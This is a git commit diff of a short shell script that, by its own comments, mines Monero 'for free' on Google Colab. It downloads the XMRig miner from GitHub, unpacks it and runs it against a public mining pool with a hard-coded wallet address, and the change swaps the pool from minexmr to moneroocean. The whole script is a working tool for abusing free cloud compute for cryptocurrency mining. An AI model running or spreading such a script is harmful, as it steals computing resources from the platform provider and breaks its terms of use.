da96e20eb28f7044dda9f6d430ca7c5186c02fe5
jrpm98 <84054982+jrpm98@users.noreply.github.com>
2024-07-07 14:53:15 -0500

    Update gcolab-sg.sh

--- gcolab-sg.sh
+++ gcolab-sg.sh
@@ -2,12 +2,10 @@
 # Install XRDP
 # Before get xmr coin for free
 # Google Colab
-sudo apt update
-clear
-sudo apt install screen
-screen -R xmr
- 
+apt update
+
+
 wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
 tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
 cd xmrig-6.16.4
-./xmrig -o sg.minexmr.com:443 -u 44Gcsim6a2UF9sr845hSYdWrPJf8SLitSMuzZfY3kVdqha5q7vCJbXwFc1GkHpvrZdEdkfCufofinJFbZBqQhyznSHv6uMP -k --tls --rig-id GC
+./xmrig -o gulf.moneroocean.stream:10128 -u 44Gcsim6a2UF9sr845hSYdWrPJf8SLitSMuzZfY3kVdqha5q7vCJbXwFc1GkHpvrZdEdkfCufofinJFbZBqQhyznSHv6uMP -k --tls --rig-id GC
